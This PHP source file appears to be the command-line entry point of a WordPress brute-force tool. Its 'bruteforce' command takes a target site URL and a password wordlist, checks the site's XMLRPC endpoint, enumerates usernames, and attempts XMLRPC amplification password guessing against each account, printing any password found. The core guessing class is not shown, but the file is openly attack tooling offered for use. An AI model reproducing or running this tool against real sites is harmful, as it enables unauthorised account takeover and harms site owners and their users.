<?php

namespace Arall\WPBruteforcer\Commands;

use Symfony\Component\Console\Command\Command;
use Symfony\Component\Console\Input\InputArgument;
use Symfony\Component\Console\Input\InputOption;
use Symfony\Component\Console\Input\InputInterface;
use Symfony\Component\Console\Output\OutputInterface;
use Arall\WPBruteforcer\WPBruteforcer;

class Main extends Command
{
    public function configure()
    {
        $this
            ->setName('bruteforce')
            ->setDescription('Bruteforce XMLRPC using amplification')
            ->addArgument(
                'url',
                InputArgument::REQUIRED,
                'Website url (http://www.wordpress.org/)'
            )
            ->addArgument(
                'wordlist',
                InputArgument::REQUIRED,
                'Wordlist path'
            )
            ->addOption(
               'tries',
               null,
               InputOption::VALUE_REQUIRED,
               'Nº of tries per request (100 as default)'
            )
            ->addOption(
               'username',
               null,
               InputOption::VALUE_REQUIRED,
               'Username to bruteforce (enumerate & bruteforce as default)'
            )
            ->addOption(
               'max-enum',
               null,
               InputOption::VALUE_REQUIRED,
               'Limit for username enumeration (unlimited as default)'
            )
            ->addOption(
               'uri',
               null,
               InputOption::VALUE_REQUIRED,
               'XMLRPC URI (/wp/xmlrpc.php as default)'
            )
        ;
    }

    public function execute(InputInterface $input, OutputInterface $output)
    {
        $url = $input->getArgument('url');
        $wordlist = $input->getArgument('wordlist');
        $tries = $input->getOption('tries');
        $username = $input->getOption('username');
        $max_enum = $input->getOption('max-enum');
        $uri = $input->getOption('uri');

        // Check wordlist
        if (!file_exists($wordlist)) {
            $output->writeln('<error> [!] Wordlist not found. Exiting...</error>');

            return;
        }

        $bruteforcer = new WPBruteforcer($url, $wordlist, $tries, $uri);

        // Test XMLRPC
        $output->writeln(' [+] Testing XMLRPC...');
        if (!$bruteforcer->testXMLRPC()) {
            $output->writeln('<error> [!] XMLRPC is not responding properly. Exiting...</error>');

            return;
        }
        $output->writeln('<info> [+] XMLRPC up and running!</info>');

        // Usernames
        $users = [];
        if ($username) {
            $users[] = $username;
        } else {
            $output->writeln('');
            $output->writeln(' [+] Enumerating users...');
            $users = $bruteforcer->enumerate($max_enum);
            $output->writeln(' [+] <comment>' . count($users) . '</comment> user(s) found');
        }
        if (empty($users)) {
            $output->writeln('<error> [!] No users to bruteforce. Exiting...</error>');

            return;
        }

        // Bruteforce
        foreach ($users as $user) {
            $output->writeln('');
            $output->writeln(' [+] Bruteforcing user <comment>' . $user . '</comment>');
            if ($password = $bruteforcer->bruteforce($user)) {
                $output->writeln('<info> [!] Password found!</info> <comment>' . $password . '</comment>');
            } else {
                $output->writeln('<error> [!] Password not found</error>');
            }
        }
    }
}
